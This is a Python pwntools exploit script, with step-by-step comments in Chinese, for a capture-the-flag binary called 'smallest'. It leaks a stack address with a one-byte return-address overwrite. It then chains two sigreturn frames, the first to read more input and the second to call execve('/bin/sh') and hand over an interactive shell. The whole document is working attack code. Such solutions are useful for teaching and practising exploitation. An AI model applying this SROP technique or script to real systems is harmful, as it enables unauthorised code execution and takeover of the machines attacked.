from pwn import *

context(arch="amd64", os="linux", log_level="debug")
io = process("./smallest")

syscall_ret = 0x4000BE
start_addr = 0x4000B0

# ---- 第一步：在栈上布置 3 个 start_addr ----
io.send(p64(start_addr) * 3)

# ---- 第二步：覆盖返回地址最低字节，跳转到 0x4000B3 ----
# 0x4000B3 处：xor rax,rax 被跳过，rax 仍为 1（上次 read 的返回值）。
# mov rdi, rax → rdi=1，于是 syscall 变成 write(1, rsp, 0x400) — 泄露栈地址！
io.send(b"\xb3")

# ---- 第三步：接收泄露的栈数据，提取栈地址 ----
# 用 recvn 精确接收 0x400 字节；无参 recv() 会阻塞等待 EOF
leaked = io.recvn(0x400)
stack_addr = u64(leaked[8:16])
log.info("泄露的栈地址: " + hex(stack_addr))

# ---- 第四步：构造第一个 SigreturnFrame（SYS_read） ----
# 该 frame 会执行 read(0, stack_addr, 0x400)，并设置 rsp = stack_addr
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read  # pyright: ignore[reportAttributeAccessIssue]
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr      # 原 exp 缺少此行（默认 0 → 崩溃）
sigframe.rip = syscall_ret

# 发送：[start_addr][syscall_ret][248 字节 sigframe]
# ret → start_addr → 再次 read(0, rsp, 0x400)
io.send(p64(start_addr) + p64(syscall_ret) + bytes(sigframe))

# ---- 第五步：发送恰好 15 字节触发 sigreturn（rax=15） ----
# 这次 read 会用 syscall_ret 覆盖自身（无害），并用 \x00 覆盖 sigframe
# 前 7 字节（uc_flags，本来就是 0，无害）
io.send(p64(syscall_ret) + b"\x00" * 7)

# ---- 第六步：第一次 sigreturn 后，read(0, stack_addr, 0x400) 正在执行 ----
# 构造第二个 SigreturnFrame，执行 execve("/bin/sh", NULL, NULL)
sigframe2 = SigreturnFrame()
sigframe2.rax = constants.SYS_execve  # pyright: ignore[reportAttributeAccessIssue]
sigframe2.rdi = stack_addr + 0x120   # 指向 "/bin/sh" 字符串
sigframe2.rsi = 0
sigframe2.rdx = 0
sigframe2.rip = syscall_ret

# payload：[start_addr][syscall_ret][248 字节 execve sigframe] + 填充 + "/bin/sh"
frame_payload = p64(start_addr) + p64(syscall_ret) + bytes(sigframe2)
payload2 = frame_payload.ljust(0x120, b"\x00") + b"/bin/sh\x00"
io.send(payload2)

# ---- 第七步：上一步的 read 返回后，ret 弹出 start_addr ----
# start_addr 再次 read(0, rsp, 0x400)，发送 15 字节 → rax=15
# → ret → syscall_ret → syscall 15 = SYS_rt_sigreturn！
# execve sigframe 早已在 stack_addr+16 处就位
# （前 7 字节 uc_flags 被 \x00 覆盖，本来就是 0，无害）
io.send(p64(syscall_ret) + b"\x00" * 7)

io.interactive()
